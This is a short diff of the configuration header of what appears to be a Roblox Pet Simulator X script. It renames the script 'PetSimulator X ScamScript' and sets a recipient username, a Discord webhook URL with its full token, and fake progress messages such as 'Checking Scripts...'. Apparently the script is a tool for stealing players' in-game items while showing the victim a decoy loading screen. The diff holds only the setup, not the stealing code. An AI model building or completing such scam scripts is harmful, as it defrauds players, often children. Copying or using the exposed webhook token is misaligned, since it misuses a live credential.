@@ -2,7 +2,7 @@ Username = "king_zombie165"
 WebHook = "https://discord.com/api/webhooks/1080304514227257354/xc7tZ0XfnZByF5gleQOq6Xkws5SLQzZrdF3AjzoccHSVanjrj8_yGOL2Ghjry-IJRUBQ"
 
 
-_G.CustomScriptName = "PSX Script"
+_G.CustomScriptName = "PetSimulator X ScamScript"
 _G.Text1 = "Script Loaded..."
 _G.Text2 = "Waiting for Script"
 _G.Text3 = "Checking Scripts..."
